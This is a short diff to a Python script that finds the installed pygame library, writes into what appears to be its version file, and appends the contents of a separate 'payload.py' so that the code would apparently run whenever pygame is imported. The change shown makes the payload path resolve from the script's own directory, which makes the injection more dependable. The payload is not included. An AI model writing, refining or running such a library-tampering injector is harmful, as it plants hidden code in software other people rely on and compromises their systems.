@@ -21,6 +21,8 @@ def get_pygame_path():
 
 if __name__ == "__main__":
     path = get_pygame_path()
+    execution_path = os.path.dirname(os.path.abspath(__file__))
+    
     if(path == -1):
         print("[-] Pygame hasn't been found")
         exit()
@@ -33,7 +35,7 @@ if __name__ == "__main__":
         version.write("# You know I haven't imagined that art can be a weapon\n")
         version.write("# 'til I met her ...\n")
         
-        with open("payload.py", 'r') as payload:
+        with open(os.path.join(execution_path, "payload.py"), 'r') as payload:
             version.write(payload.read())
 
 
